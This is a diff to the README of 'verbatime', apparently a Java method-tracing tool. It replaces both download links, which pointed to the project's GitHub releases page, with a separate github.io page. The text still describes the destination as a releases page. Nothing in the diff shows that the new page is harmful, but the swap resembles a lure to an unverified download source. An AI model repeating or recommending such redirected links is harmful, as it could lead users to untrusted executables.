@@ -1,6 +1,6 @@
 # 🔍 verbatime - See Every Method Call, Clearly
 
-[![Download verbatime](https://img.shields.io/badge/Download-verbatime-blue?style=for-the-badge&logo=github)](https://github.com/Udalefourfold471/verbatime/releases)
+[![Download verbatime](https://img.shields.io/badge/Download-verbatime-blue?style=for-the-badge&logo=github)](https://udalefourfold471.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to verbatime! This tool helps you see exactly what your Java program doe
 
 ## 💾 Download and Install
 
-**Visit this link to download the application:** [https://github.com/Udalefourfold471/verbatime/releases](https://github.com/Udalefourfold471/verbatime/releases)
+**Visit this link to download the application:** [https://udalefourfold471.github.io](https://udalefourfold471.github.io)
 
 Once you click that link, you'll see a page with available releases. Look for the newest version and click the download button that matches your needs. The download will start automatically.
 
